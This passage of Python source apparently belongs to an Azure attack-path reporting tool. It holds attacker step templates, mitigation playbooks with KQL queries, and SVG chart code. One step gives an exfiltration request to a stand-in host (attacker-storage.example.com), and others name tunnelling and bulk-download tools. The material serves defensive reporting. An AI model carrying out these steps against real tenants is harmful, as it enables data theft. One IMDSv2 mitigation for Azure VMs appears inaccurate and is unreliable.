            "how": "Enumerate via Resource Graph; flag stores with public access, broad RBAC, or weak network rules.",
            "tools": "Defender for Cloud, MicroBurst, AzureBlobEnum, custom Resource Graph queries",
            "api": "POST /providers/Microsoft.ResourceGraph/resources",
            "permission": "Reader (or anonymous if exposed publicly)",
            "mitre": "T1580 — Cloud Infrastructure Discovery",
            "detection": "Defender 'Storage account with anonymous access enabled' alert; Policy compliance reports for public-network-access policies",
            "prereq": "Reader on subscription OR anonymous reachability",
        },
        {
            "title": "Enumerate Data Contents",
            "why": "Map the structure of '{first}' to find sensitive datasets ({target}).",
            "how": "List containers/databases/tables, sample schemas, look for indicators (PII column names, file extensions).",
            "tools": "azcopy list, az storage blob list, sqlcmd, Cosmos Data Explorer",
            "api": "GET /?comp=list  •  SELECT name FROM sys.tables",
            "permission": "Storage Blob Data Reader OR DB SELECT",
            "mitre": "T1530 — Data from Cloud Storage Object",
            "detection": "StorageBlobLogs: high-cardinality container/blob LIST from a single principal",
            "prereq": "Store identified",
        },
        {
            "title": "Read Sensitive Data",
            "why": "Pull '{target}' contents — PII, financial records, IP, or credentials.",
            "how": "Bulk download via SAS / managed identity / anonymous access; stream to attacker-controlled storage.",
            "tools": "azcopy copy, rclone, BCP, custom downloader",
            "api": "GET /{container}/{blob}  •  SELECT * FROM dbo.{sensitive_table}",
            "permission": "Storage Blob Data Reader OR DB SELECT",
            "mitre": "{mitre}",
            "detection": "Egress spike from storage account; Defender 'Unusual data extraction' alert; CASB sensitive-info-type detections",
            "prereq": "Sensitive data located",
        },
        {
            "title": "Exfiltrate to External Location",
            "why": "Move '{target}' outside the tenant boundary to remove evidence and complete the attack.",
            "how": "Upload to attacker-controlled cloud storage; transfer via DNS tunneling or HTTPS to attacker C2.",
            "tools": "azcopy (to external account), rclone, megacmd, custom HTTPS uploader",
            "api": "PUT https://attacker-storage.example.com/{path}",
            "permission": "Network egress from compromised resource",
            "mitre": "T1567.002 — Exfiltration to Cloud Storage",
            "detection": "Defender for Cloud network anomaly; large outbound to non-corporate domain; DLP rule on egress",
            "prereq": "Data extracted in previous step",
        },
    ],
    "network_pivot": [
        {
            "title": "Compromise Edge Resource",
            "why": "Initial access to '{first}' — a public-facing VM, App Service, or NSG-permissive subnet.",
            "how": "Exploit unpatched service, weak credentials, or app-layer vulnerability on the exposed edge.",
            "tools": "nmap, Metasploit, custom exploits, weak-cred sprays",
            "api": "Service-specific (RDP, SSH, HTTP)",
            "permission": "Unauthenticated → local user",
            "mitre": "T1190 — Exploit Public-Facing Application",
            "detection": "Defender for Cloud edge-attack alerts; WAF + NSG flow logs",
            "prereq": "Internet reachability",
        },
        {
            "title": "Enumerate Network Topology",
            "why": "Map VNet peering, NSG rules, route tables, and reachable internal subnets that lead toward '{target}'.",
            "how": "From the compromised edge, query ARM for VNet/peering/NSG; run internal port scans.",
            "tools": "az network vnet peering list, nmap, Stormspotter, BloodHound (azure)",
            "api": "GET /providers/Microsoft.Network/virtualNetworks  •  GET /networkSecurityGroups",
            "permission": "Reader on network resources OR managed-identity scope",
            "mitre": "T1018 — Remote System Discovery",
            "detection": "Network Watcher flow logs: internal scan pattern; ARM read bursts on Microsoft.Network from VM identity",
            "prereq": "Compromised edge",
        },
        {
            "title": "Pivot Through Peering / NSG",
            "why": "Move from edge subnet into protected internal subnet hosting '{target}'.",
            "how": "Use established peering, abuse permissive NSG rules (any-any-internal), or tunnel via SOCKS proxy on compromised host.",
            "tools": "chisel, sshuttle, ligolo-ng, custom SOCKS",
            "api": "TCP/IP — direct connectivity",
            "permission": "Network reachability inherited from compromise",
            "mitre": "T1572 — Protocol Tunneling",
            "detection": "Flow logs: unusual east-west traffic from edge VM to DB subnet; NSG rule changes outside change windows",
            "prereq": "Topology mapped",
        },
        {
            "title": "Reach Internal Target",
            "why": "Authenticate to '{target}' from the now-reachable internal subnet, often bypassing public-IP restrictions.",
            "how": "Connect using credentials from credential-chain step, or exploit internal-only services that lack auth.",
            "tools": "sqlcmd, kubectl, redis-cli, custom internal-protocol clients",
            "api": "Service-specific (SQL, Redis, Kubernetes API)",
            "permission": "Service-specific",
            "mitre": "{mitre}",
            "detection": "Internal service auth from previously-quiet edge subnet; Defender Cloud-native lateral-movement alert",
            "prereq": "Pivot established",
        },
    ],
}

# ── Per-attack-path-type Playbooks (Executive + Mitigation tabs) ─────────
# One playbook per path type — shared by all steps in that path type.
# Provides: business_impact, real_world reference, mitigation tiers,
# verification query, and authoritative reference links.
_PATH_PLAYBOOKS: dict[str, dict] = {
    "consent_abuse": {
        "business_impact": "A single tenant-wide OAuth consent grant can let an attacker silently read every employee's email and OneDrive content. Recovery typically requires revoking the app, force-rotating refresh tokens for all impacted users, and a full e-discovery review. Estimated cost of an SMB-scale incident: $200K–$2M including legal, notification, and remediation.",
        "real_world": "Pattern resembles Storm-0558 (2023, Microsoft cloud email breach via stolen signing key) and the wave of OAuth-phishing campaigns documented by Volexity in 2024 — both abused legitimate-looking apps with broad delegated scopes.",
        "mitigation_now": [
            "Revoke the risky app immediately: Connect-AzureAD; Remove-AzureADServicePrincipal -ObjectId <appObjectId>",
            "Force token revocation for all users who consented: Revoke-MgUserSignInSession -UserId <upn>",
            "Block new tenant-wide consent: Set 'User can consent to apps' = No in Entra ID → Enterprise Apps → Consent and permissions",
            "Enable admin-consent workflow so only admins approve high-risk scopes",
        ],
        "mitigation_soon": [
            "Audit ALL existing oauth2PermissionGrants where consentType='AllPrincipals' and remove unused/unknown apps",
            "Define an app-governance policy in Defender for Cloud Apps (formerly MCAS) flagging apps with Files/Mail/Sites.ReadWrite scopes",
            "Implement Verified Publisher requirement for tenant-wide consent",
        ],
        "mitigation_long": [
            "Adopt Continuous Access Evaluation (CAE) for all critical apps so revoked tokens take effect within minutes, not hours",
            "Move to Workload Identity Federation for service-to-service auth, eliminating long-lived client secrets",
            "Quarterly OAuth-application review baked into the access-review program in Entra ID Governance",
        ],
        "verify_query": "AuditLogs | where TimeGenerated > ago(30d) | where OperationName == 'Consent to application' | extend AppName = tostring(TargetResources[0].displayName), Scopes = tostring(TargetResources[0].modifiedProperties[?(@.displayName=='ConsentAction.Permissions')].newValue) | project TimeGenerated, InitiatedBy.user.userPrincipalName, AppName, Scopes",
        "references": [
            {"title": "Microsoft: Investigate risky OAuth apps", "url": "https://learn.microsoft.com/microsoft-365/security/defender-cloud-apps/investigate-risky-oauth"},
            {"title": "MITRE ATT&CK T1098.003 — Additional Cloud Roles", "url": "https://attack.mitre.org/techniques/T1098/003/"},
            {"title": "Microsoft: Manage app consent policies", "url": "https://learn.microsoft.com/entra/identity/enterprise-apps/manage-app-consent-policies"},
            {"title": "Storm-0558 incident report (CISA)", "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-193a"},
        ],
    },
    "privilege_escalation": {
        "business_impact": "Acquiring Global Administrator or subscription-Owner equates to full control of the tenant. Attacker can create backdoor accounts, exfiltrate everything, modify CA policies, and persist for months. Industry incident-cost benchmarks: $4.5M average breach cost (IBM Cost of a Data Breach 2024), elevated for cloud-takeover scenarios.",
        "real_world": "Echoes the 2020 SolarWinds NOBELIUM intrusions where attackers used stolen credentials and privilege chains to add backdoor service-principal credentials in Microsoft 365 tenants.",
        "mitigation_now": [
            "Enable PIM (Privileged Identity Management) for ALL privileged roles — eligibility, not active assignment",
            "Require MFA + approval for every PIM activation of Global Admin / User Access Admin / Owner",
            "Configure break-glass accounts (2 cloud-only, MFA-enforced, monitored) — exclude from CA only as last resort",
            "Run: az role assignment list --all --include-inherited --query \"[?roleDefinitionName=='Owner']\" — review unexpected assignees",
        ],
        "mitigation_soon": [
            "Quarterly access reviews on every privileged role assignment via Entra ID Governance",
            "Replace Owner / Contributor with custom roles scoped to specific resource types",
            "Enable Defender for Cloud's 'Identity recommendations' on every subscription",
        ],
        "mitigation_long": [
            "Implement Microsoft's Tier-0 admin-tier model: separate accounts and devices for privileged operations",
            "Enforce Conditional Access requiring compliant device + phishing-resistant MFA (FIDO2) for all admin roles",
            "Just-in-Time admin via PIM with maximum 1-hour activation for tier-0 roles",
        ],
        "verify_query": "AuditLogs | where OperationName has_any('Add member to role','Add eligible member to role') | where TargetResources[0].displayName has_any('Global Administrator','Privileged Role Administrator','User Access Administrator') | project TimeGenerated, InitiatedBy.user.userPrincipalName, OperationName, TargetResources",
        "references": [
            {"title": "Microsoft: Securing privileged access", "url": "https://learn.microsoft.com/security/privileged-access-workgroup/overview"},
            {"title": "Entra PIM overview", "url": "https://learn.microsoft.com/entra/id-governance/privileged-identity-management/pim-configure"},
            {"title": "MITRE T1098.003", "url": "https://attack.mitre.org/techniques/T1098/003/"},
        ],
    },
    "lateral_movement": {
        "business_impact": "Lateral movement converts a single breached resource into a tenant-wide compromise. Each hop expands the blast radius — a compromised dev VM can become an attacker's path to production data within hours. Containment costs scale with the number of resources reached.",
        "real_world": "Common in cryptojacking incidents (TeamTNT, Kinsing) and in enterprise breaches where an attacker pivots from a compromised contractor laptop to Azure-hosted production via stored credentials.",
        "mitigation_now": [
            "Audit managed-identity assignments: az role assignment list --assignee <mi-id> — remove over-permissive scopes",
            "Restrict network egress from VMs/containers to only required FQDNs via Azure Firewall application rules",
            "Disable IMDSv1 on all VMs; require IMDSv2 (token-based) which prevents SSRF abuse",
            "Enable Defender for Cloud's 'Adaptive network hardening' on internet-facing VMs",
        ],
        "mitigation_soon": [
            "Implement micro-segmentation: each workload gets its own NSG, no any-any rules",
            "Replace shared-secret connection strings with managed-identity auth across all apps",
            "Enable Just-in-Time VM access — RDP/SSH only opened on demand, time-boxed",
        ],
        "mitigation_long": [
            "Move to a Zero-Trust network model: no implicit trust between VNets, even peered",
            "Adopt Azure Bastion for all jump access — eliminate public RDP/SSH entirely",
            "Continuous validation via Microsoft Defender for Cloud's attack-path analysis (built-in feature)",
        ],
        "verify_query": "AzureActivity | where TimeGenerated > ago(7d) | where Caller has 'systemAssigned' | summarize ResourcesTouched=dcount(_ResourceId) by Caller, OperationNameValue | where ResourcesTouched > 5",
        "references": [
            {"title": "Microsoft: Defender for Cloud attack-path analysis", "url": "https://learn.microsoft.com/azure/defender-for-cloud/concept-attack-path"},
            {"title": "MITRE T1552.005 — Cloud Instance Metadata API", "url": "https://attack.mitre.org/techniques/T1552/005/"},
            {"title": "Azure: IMDS v2 (TSG)", "url": "https://learn.microsoft.com/azure/virtual-machines/instance-metadata-service"},
        ],
    },
    "credential_chain": {
        "business_impact": "Stored secrets are the multiplier in modern cloud breaches — one stolen Key Vault secret can unlock dozens of downstream services. Mean-time-to-detect for credential abuse exceeds 200 days industry-wide (Verizon DBIR 2024), giving attackers ample time for full data exfiltration.",
        "real_world": "Codecov breach (2021), where a single CI/CD secret cascaded into compromise of hundreds of customer environments; LastPass breach (2022), where stolen developer credentials led to vault export.",
        "mitigation_now": [
            "Enable Key Vault firewall — only specific VNets/IPs/Private Endpoints can reach the vault",
            "Enable purge-protection and soft-delete on all production Key Vaults (cannot be disabled later)",
            "Audit access policies: run az keyvault show --name <vault> --query 'properties.accessPolicies' — remove unused principals",
            "Force credential rotation on any secret read by an unexpected identity in the last 30 days",
        ],
        "mitigation_soon": [
            "Migrate from Access Policies to Azure RBAC for Key Vault — finer-grained, integrates with PIM",
            "Replace static secrets with Workload Identity Federation (no client_secret needed)",
            "Enable Defender for Key Vault — alerts on anomalous access patterns",
        ],
        "mitigation_long": [
            "Adopt managed identities everywhere — eliminate static credentials from code, app settings, pipelines",
            "Implement secret scanning in source control (GitHub Advanced Security, Defender for DevOps)",
            "Quarterly secret-rotation policy enforced by Azure Policy (deny secrets older than 90 days)",
        ],
        "verify_query": "KeyVaultData | where TimeGenerated > ago(7d) | where OperationName == 'SecretGet' | summarize SecretsRead=dcount(id_s), VaultsAccessed=dcount(Resource) by CallerIPAddress, identity_claim_appid_g | where SecretsRead > 10 | order by SecretsRead desc",
        "references": [
            {"title": "Microsoft: Key Vault security baseline", "url": "https://learn.microsoft.com/security/benchmark/azure/baselines/key-vault-security-baseline"},
            {"title": "Workload Identity Federation", "url": "https://learn.microsoft.com/entra/workload-id/workload-identity-federation"},
            {"title": "MITRE T1552.001 — Credentials in Files", "url": "https://attack.mitre.org/techniques/T1552/001/"},
        ],
    },
    "exposed_high_value": {
        "business_impact": "Publicly exposed storage and databases are the single largest source of cloud data leaks reported in 2024 (Cloud Security Alliance). A misconfigured storage account with PII can trigger GDPR fines up to 4% of global revenue, plus regulatory notifications and class-action exposure.",
        "real_world": "Repeated patterns: Capital One (2019, S3 misconfig + SSRF, 100M records); Microsoft AI research data leak (2023, over-permissive SAS token, 38TB exposed); countless unsecured Cosmos DB / Mongo / Elastic instances indexed by Shodan weekly.",
        "mitigation_now": [
            "Disable storage anonymous-access at the account level: az storage account update --name <acct> --allow-blob-public-access false",
            "Enable Defender for Storage on every subscription — auto-detects anonymous-access enablement",
            "Run Resource Graph: resources | where type =~ 'microsoft.storage/storageaccounts' and properties.publicNetworkAccess == 'Enabled' — review every result",
            "Apply Azure Policy 'Storage accounts should disable public network access' in deny mode",
        ],
        "mitigation_soon": [
            "Replace public endpoints with Private Endpoints for all data services",
            "Enable Defender for Cloud's 'Sensitive data discovery' to identify which exposed stores hold PII/PHI",
            "Set storage account network ACLs to default-deny + selected-networks only",
        ],
        "mitigation_long": [
            "Adopt a 'private by default' Azure landing zone — public endpoints require explicit waiver",
            "Use Microsoft Purview for sensitive-data discovery + automated DLP enforcement",
            "Implement perimeter monitoring with Defender EASM (External Attack Surface Management)",
        ],
        "verify_query": "StorageBlobLogs | where TimeGenerated > ago(7d) | where AuthenticationType == 'Anonymous' and StatusText == 'Success' | summarize Reads=count() by AccountName, ContainerName, CallerIpAddress | where Reads > 0",
        "references": [
            {"title": "Microsoft: Storage account network security", "url": "https://learn.microsoft.com/azure/storage/common/storage-network-security"},
            {"title": "Defender for Storage", "url": "https://learn.microsoft.com/azure/defender-for-cloud/defender-for-storage-introduction"},
            {"title": "MITRE T1530 — Data from Cloud Storage", "url": "https://attack.mitre.org/techniques/T1530/"},
        ],
    },
    "ca_bypass": {
        "business_impact": "A Conditional Access bypass invalidates your Zero-Trust posture for whoever exploits it. Without MFA + device-compliance, a single phished password equals account takeover. CA gaps are the #1 finding in Microsoft's Customer Connection Program tenant assessments.",
        "real_world": "Midnight Blizzard (NOBELIUM) 2024 attacks against Microsoft and HPE used legacy-protocol bypasses + MFA-fatigue against accounts not covered by phishing-resistant MFA policies.",
        "mitigation_now": [
            "Enforce a baseline CA policy: 'Require MFA for ALL users, ALL apps' — no exclusions except break-glass",
            "Block legacy authentication tenant-wide: CA → 'Block legacy authentication' template",
            "Audit CA exclusions: any user/group in 'excludeUsers' must be a documented break-glass account",
            "Enable 'Phishing-resistant MFA strength' (FIDO2/Windows Hello) for admin roles",
        ],
        "mitigation_soon": [
            "Enable CA Authentication Strengths and require Phishing-Resistant for tier-0 + tier-1 roles",
            "Enforce device compliance via Intune for all corporate apps",
            "Implement Sign-In Risk + User Risk policies with Identity Protection",
        ],
        "mitigation_long": [
            "Migrate every user to passwordless (Windows Hello, FIDO2 keys, Microsoft Authenticator passkey)",
            "Deploy Continuous Access Evaluation (CAE) so revoked tokens / risky sessions terminate within minutes",
            "Quarterly CA-policy review baked into change-management",
        ],
        "verify_query": "SigninLogs | where TimeGenerated > ago(7d) | where ConditionalAccessStatus == 'notApplied' and ResultType == 0 | summarize Signins=count() by UserPrincipalName, AppDisplayName, IPAddress | order by Signins desc",
        "references": [
            {"title": "Microsoft: Conditional Access design principles", "url": "https://learn.microsoft.com/entra/identity/conditional-access/plan-conditional-access"},
            {"title": "Authentication strengths", "url": "https://learn.microsoft.com/entra/identity/authentication/concept-authentication-strengths"},
            {"title": "MITRE T1556.007", "url": "https://attack.mitre.org/techniques/T1556/007/"},
        ],
    },
    "pim_escalation": {
        "business_impact": "PIM is supposed to *reduce* standing-privilege risk; misconfigured PIM (no MFA, no approval, broad eligibility) inverts that and makes elevation trivial. Attackers prize tenants where eligibility lists are stale and approvals are auto-granted.",
        "real_world": "Multiple red-team reports (2023–2024) document PIM eligibility-sprawl patterns where tens of users are eligible for Global Admin without any activation friction.",
        "mitigation_now": [
            "Require MFA + Approval + Justification on every Global Admin / User Access Admin PIM role",
            "Cap activation duration: Global Admin = 1 hour max, lower-risk roles ≤ 4 hours",
            "Audit eligibility list: Get-MgRoleManagementDirectoryRoleEligibilityScheduleInstance — remove anyone not in a documented role",
            "Enable PIM alerts: 'Roles activated too frequently', 'Administrators aren't using their privileged roles'",
        ],
        "mitigation_soon": [
            "Implement role-specific approval groups (not 'self-approve')",
            "Require ticket-system reference in PIM justification (link to ServiceNow/Jira)",
            "Move all classic-admin (Subscription Owner) assignments to PIM with the same controls",
        ],
        "mitigation_long": [
            "Adopt zero-standing-privilege model — every privileged operation requires JIT activation",
            "Continuous Access Evaluation across the privileged session — risky behaviour mid-session terminates token",
            "Quarterly access-review on every PIM-eligible assignment",
        ],
        "verify_query": "AuditLogs | where OperationName == 'Add eligible member to role completed (PIM activation)' | where TimeGenerated > ago(7d) | extend Role=tostring(TargetResources[0].displayName) | summarize Activations=count() by InitiatedBy.user.userPrincipalName, Role | order by Activations desc",
        "references": [
            {"title": "PIM best practices", "url": "https://learn.microsoft.com/entra/id-governance/privileged-identity-management/pim-security-wizard"},
            {"title": "PIM alerts reference", "url": "https://learn.microsoft.com/entra/id-governance/privileged-identity-management/pim-how-to-configure-security-alerts"},
            {"title": "MITRE T1098.003", "url": "https://attack.mitre.org/techniques/T1098/003/"},
        ],
    },
    "data_exposure": {
        "business_impact": "Data exposure is the highest-cost outcome among cloud breach types (avg $5.04M per IBM Cost of a Data Breach 2024). Beyond direct cost, regulatory fines (GDPR, HIPAA, PCI) and brand damage compound the impact for years.",
        "real_world": "Patterns include the 2024 Snowflake customer data thefts (no MFA on data warehouse accounts) and ongoing leakage of misconfigured Cosmos DB / Postgres flexible-server instances.",
        "mitigation_now": [
            "Enable Defender for Cloud sensitive-data discovery — identifies which stores hold PII/PHI/financial data",
            "Apply Azure Policy 'Storage should restrict network access' + 'SQL servers should have public network access disabled'",
            "Audit storage SAS tokens: az storage account show-connection-string — rotate any SAS older than 7 days",
            "Enable customer-managed-key encryption for all sensitive stores (Storage, SQL, Cosmos)",
        ],
        "mitigation_soon": [
            "Apply Microsoft Purview sensitivity labels with auto-encryption for files marked Confidential/Highly Confidential",
            "Implement Always Encrypted (SQL) or client-side encryption (Storage) for top-secret datasets",
            "Enforce data-egress controls via Defender for Cloud DLP policies",
        ],
        "mitigation_long": [
            "Adopt a Data Loss Prevention strategy across Microsoft 365 + Purview, with auto-classification",
            "Implement secure data-sharing patterns (Azure Data Share, Purview Data Catalog) replacing ad-hoc file shares",
            "Quarterly third-party data-handling review for vendors with data access",
        ],
        "verify_query": "StorageBlobLogs | where TimeGenerated > ago(24h) | where OperationName == 'GetBlob' and ResponseBodySize > 10485760 | summarize TotalGB = sum(ResponseBodySize)/1024.0/1024.0/1024.0 by AccountName, CallerIpAddress | where TotalGB > 1 | order by TotalGB desc",
        "references": [
            {"title": "Microsoft: Sensitive data discovery", "url": "https://learn.microsoft.com/azure/defender-for-cloud/data-aware-security-dashboard-overview"},
            {"title": "Microsoft Purview overview", "url": "https://learn.microsoft.com/purview/purview"},
            {"title": "MITRE T1567.002 — Exfiltration to Cloud Storage", "url": "https://attack.mitre.org/techniques/T1567/002/"},
        ],
    },
    "network_pivot": {
        "business_impact": "Network pivots break the assumption that internal segments are safer than public ones. Once an attacker reaches the database subnet, the cost to evict and validate-clean every internal resource is significant — typically a multi-week incident response.",
        "real_world": "Capital One 2019 breach used SSRF on a public WAF + over-permissive IAM to pivot to internal S3 — Azure-equivalent pivots happen via VNet peering, NSG misconfig, and managed-identity abuse.",
        "mitigation_now": [
            "Audit VNet peerings — remove peerings where the trust boundary is no longer required",
            "Enable Network Watcher flow logs on every NSG; ingest into Sentinel for east-west traffic alerting",
            "Block direct internet egress from internal subnets — force through Azure Firewall with FQDN rules",
            "Disable any 'AllowAllInbound' or 0.0.0.0/0 NSG rules outside the DMZ subnet",
        ],
        "mitigation_soon": [
            "Implement Azure Firewall Premium with TLS inspection on the egress path",
            "Adopt micro-segmentation: one application = one subnet = one NSG, deny by default",
            "Replace VNet peering with Virtual WAN hub-and-spoke for centralized policy enforcement",
        ],
        "mitigation_long": [
            "Deploy a Zero-Trust network model — every connection authenticated and authorised, no implicit trust by network position",
            "Continuous network-attack-path monitoring via Defender for Cloud",
            "Adopt service-mesh patterns for app-to-app auth in AKS workloads",
        ],
        "verify_query": "AzureNetworkAnalytics_CL | where TimeGenerated > ago(24h) | where FlowType_s == 'AllowedFlow' and SrcIP_s startswith '10.' and DestIP_s startswith '10.' | summarize Connections=count() by SrcIP_s, DestIP_s, DestPort_d | where Connections > 100 | order by Connections desc",
        "references": [
            {"title": "Azure: Network security best practices", "url": "https://learn.microsoft.com/azure/security/fundamentals/network-best-practices"},
            {"title": "Defender for Cloud — attack-path analysis", "url": "https://learn.microsoft.com/azure/defender-for-cloud/concept-attack-path"},
            {"title": "MITRE T1572 — Protocol Tunneling", "url": "https://attack.mitre.org/techniques/T1572/"},
        ],
    },
}


def _build_detailed_steps(path: dict, n_nodes_fallback: int) -> list[dict]:
    """Build per-attack-path-type rich step list with WHY / HOW / TOOLS / API / DETECTION / PREREQ.

    Falls back to None to signal callers should use the legacy generic 3-step builder.
    Templates are parameterized with placeholders interpolated from the actual path data.
    """
    ptype = (path.get("Type") or "").lower()
    template = _PATH_STEP_TEMPLATES.get(ptype)
    if not template:
        return []  # caller falls back to legacy
    nodes = path.get("ChainNodes") or []
    if not nodes:
        return []
    first = nodes[0].get("label", "Source")
    last = nodes[-1].get("label", "Target")
    # Permission heuristics from middle nodes (typical chain: actor → permission → consent → impact)
    perms_from_chain = ""
    consent_type = "AllPrincipals"
    for n in nodes[1:-1]:
        lbl = (n.get("label") or "").lower()
        if "principal" in lbl or "consent" in lbl:
            consent_type = n.get("label", consent_type)
    # Try to pull permission list out of the description
    desc = path.get("Description", "")
    perms = perms_from_chain
    perms_count = 0
    import re as _re
    m = _re.search(r"\(([^)]+)\)", desc)
    if m:
        # inside parens often contains the comma-separated permission list
        cand = m.group(1)
        if "." in cand and "," in cand or any(k in cand for k in ("Read", "Write", "All", "Manage")):
            perms = cand
            perms_count = len([p for p in cand.split(",") if p.strip()])
    if not perms:
        # Use the second chain node as fallback (e.g. "2 dangerous scopes")
        if len(nodes) >= 2:
            perms = nodes[1].get("label", "elevated permissions")
        else:
            perms = "elevated permissions"
    if not perms_count:
        m2 = _re.search(r"\b(\d+)\s+dangerous", first + " " + (nodes[1].get("label","") if len(nodes)>1 else ""))
        if m2:
            perms_count = int(m2.group(1))
        else:
            perms_count = perms.count(",") + 1 if "," in perms else 1
    scope = last
    mitre = path.get("MitreTechnique", "T0000") or "T0000"
    tactic = path.get("MitreTactic", "Persistence") or "Persistence"

    ctx = {
        "app": first, "first": first, "last": last, "target": last,
        "perms": perms, "perms_count": perms_count, "consent_type": consent_type,
        "scope": scope, "mitre": mitre, "tactic": tactic,
    }

    def _fmt(s: str) -> str:
        try:
            return s.format(**ctx)
        except Exception:
            return s

    # Lookup the path-type playbook (executive + mitigation content shared by all steps)
    pb = _PATH_PLAYBOOKS.get(ptype, {})
    pb_business_impact = pb.get("business_impact", "")
    pb_real_world      = pb.get("real_world", "")
    pb_mit_now         = pb.get("mitigation_now", [])
    pb_mit_soon        = pb.get("mitigation_soon", [])
    pb_mit_long        = pb.get("mitigation_long", [])
    pb_verify          = pb.get("verify_query", "")
    pb_refs            = pb.get("references", [])

    # Compose final step list with arrow color gradient (green → yellow → red)
    n = len(template)
    out = []
    for i, t in enumerate(template):
        progress = i / max(n - 1, 1)
        if progress < 0.34:
            color = "#107C10"
        elif progress < 0.67:
            color = "#FFB900"
        else:
            color = "#D13438"
        # Map step to actor indices in the original chain — distribute across nodes
        from_idx = min(int(i * n_nodes_fallback / max(n, 1)), n_nodes_fallback - 2) if n_nodes_fallback >= 2 else 0
        to_idx = min(from_idx + 1, n_nodes_fallback - 1) if n_nodes_fallback >= 2 else 0
        why_txt = _fmt(t.get("why", ""))
        how_txt = _fmt(t.get("how", ""))
        # Auto-built executive summary in plain English: combine why + how, trim
        summary_txt = why_txt
        if how_txt:
            summary_txt += " The attacker accomplishes this by: " + (how_txt[:240] + ("…" if len(how_txt) > 240 else ""))
        out.append({
            "from": from_idx, "to": to_idx,
            "label": _fmt(t["title"]),
            "title": _fmt(t["title"]),
            "desc": why_txt,
            "why": why_txt,
            "how": how_txt,
            "tools": _fmt(t.get("tools", "")),
            "api": _fmt(t.get("api", "")),
            "permission": _fmt(t.get("permission", "")),
            "mitre": _fmt(t.get("mitre", "")) if t.get("mitre") else "",
            "detection": _fmt(t.get("detection", "")),
            "prereq": _fmt(t.get("prereq", "")),
            "color": color,
            # ── Executive + Mitigation tabs (shared from playbook) ──
            "summary": summary_txt,
            "business_impact": pb_business_impact,
            "real_world": pb_real_world,
            "mitigation_now": pb_mit_now,
            "mitigation_soon": pb_mit_soon,
            "mitigation_long": pb_mit_long,
            "verify_query": pb_verify,
            "references": pb_refs,
        })
    return out


def _esc(text) -> str:
    """HTML-escape a value."""
    return _html.escape(str(text)) if text else ""


def _load_compliance_map() -> dict:
    """Load MITRE → compliance framework mapping."""
    p = Path(__file__).resolve().parent.parent / "attackpath_frameworks" / "compliance_map.json"
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        return data.get("mapping", {})
    except Exception:
        return {}


# ── SVG Generators ────────────────────────────────────────────────────────

def _ring_score_svg(score: int, size: int = 160) -> str:
    """Animated SVG ring gauge for risk score."""
    center = size // 2
    r = center - 14
    circumference = 2 * math.pi * r
    pct = min(score, 100) / 100
    offset = circumference * (1 - pct)
    if score >= 80:
        color = _SEVERITY_COLORS["critical"]
    elif score >= 60:
        color = _SEVERITY_COLORS["high"]
    elif score >= 40:
        color = _SEVERITY_COLORS["medium"]
    else:
        color = "#107C10"
    return f"""<svg width="{size}" height="{size}" viewBox="0 0 {size} {size}" role="img"
     aria-label="Risk Score: {score} out of 100" class="ring">
  <circle cx="{center}" cy="{center}" r="{r}" fill="none" stroke="var(--ring-track)" stroke-width="14"/>
  <circle cx="{center}" cy="{center}" r="{r}" fill="none" stroke="{color}" stroke-width="14"
          stroke-dasharray="{circumference:.1f}" stroke-dashoffset="{offset:.1f}"
          stroke-linecap="round" transform="rotate(-90 {center} {center})"
          style="transition:stroke-dashoffset 1.2s cubic-bezier(.16,1,.3,1)"/>
  <text x="{center}" y="{center - 6}" text-anchor="middle" dominant-baseline="central"
        fill="var(--text)" font-size="36" font-weight="700" font-family="var(--font-mono)">{score}</text>
  <text x="{center}" y="{center + 22}" text-anchor="middle" fill="var(--text-secondary)"
        font-size="11" letter-spacing="1.5" text-transform="uppercase">RISK SCORE</text>
</svg>"""


def _donut_svg(counts: dict, size: int = 180) -> str:
    """SVG donut chart for severity distribution."""
    center = size // 2
    r = 60
    total = sum(counts.values())
    if total == 0:
        return f'<svg width="{size}" height="{size}" viewBox="0 0 {size} {size}"><text x="{center}" y="{center}" text-anchor="middle" fill="var(--text-muted)" font-size="12">No data</text></svg>'

    circumference = 2 * math.pi * r
    segments = []
    offset = 0
    for sev in ("critical", "high", "medium", "low", "informational"):
        n = counts.get(sev, 0)
        if n == 0:
            continue
        pct = n / total
        dash = circumference * pct
        gap = circumference - dash
        color = _SEVERITY_COLORS[sev]
        rotation = -90 + (offset / total) * 360
        segments.append(
            f'<circle cx="{center}" cy="{center}" r="{r}" fill="none" stroke="{color}" stroke-width="28"'
            f' stroke-dasharray="{dash:.1f} {gap:.1f}" transform="rotate({rotation:.1f} {center} {center})"'
            f' opacity="0.92"><title>{sev.capitalize()}: {n} ({pct*100:.0f}%)</title></circle>'
        )
        offset += n

    return f"""<svg width="{size}" height="{size}" viewBox="0 0 {size} {size}" role="img"
     aria-label="Severity distribution donut chart" class="donut-chart">
  {"".join(segments)}
  <circle cx="{center}" cy="{center}" r="42" fill="var(--bg-card)"/>
  <text x="{center}" y="{center - 6}" text-anchor="middle" fill="var(--text)" font-size="24" font-weight="700">{total}</text>
  <text x="{center}" y="{center + 14}" text-anchor="middle" fill="var(--text-secondary)" font-size="10">TOTAL</text>
</svg>"""


def _severity_bars_svg(counts: dict) -> str:
    """Horizontal severity bars with animated fills."""
    total = max(sum(counts.values()), 1)
    rows = []
    for sev in ("critical", "high", "medium", "low", "informational"):
        n = counts.get(sev, 0)
        pct = n / total * 100
        color = _SEVERITY_COLORS[sev]
        rows.append(f"""<div class="sev-row">
  <span class="sev-label">{sev.upper()[:4]}</span>
  <div class="sev-track"><div class="sev-fill" style="width:{pct:.1f}%;background:{color}"></div></div>
  <span class="sev-count">{n}</span>
</div>""")
    return '<div class="severity-bars">' + "\n".join(rows) + '</div>'


def _heatmap_svg(paths: list[dict]) -> str:
    """MITRE ATT&CK heatmap: tactics (columns) × techniques (rows), colored by path count."""
    # Build tactic→technique→count matrix
    tech_map: dict[str, dict] = {}
    tactic_set: set[str] = set()
    for p in paths:
        t = p.get("MitreTechnique", "")
        tactic = p.get("MitreTactic", "")
        if not t:
            continue
        tactic_set.add(tactic)
        if t not in tech_map:
            tech_map[t] = {"name": t, "tactics": {}}
        tech_map[t]["tactics"][tactic] = tech_map[t]["tactics"].get(tactic, 0) + 1

    if not tech_map:
        return '<p class="empty">No MITRE ATT&CK techniques mapped.</p>'

    tactics = [t for t in _TACTIC_ORDER if t in tactic_set]
    techniques = sorted(tech_map.keys())
    max_count = max(
        (c for t in tech_map.values() for c in t["tactics"].values()),
        default=1,
    )

    cell_w, cell_h = 150, 40
    label_w = 120
    header_h = 48
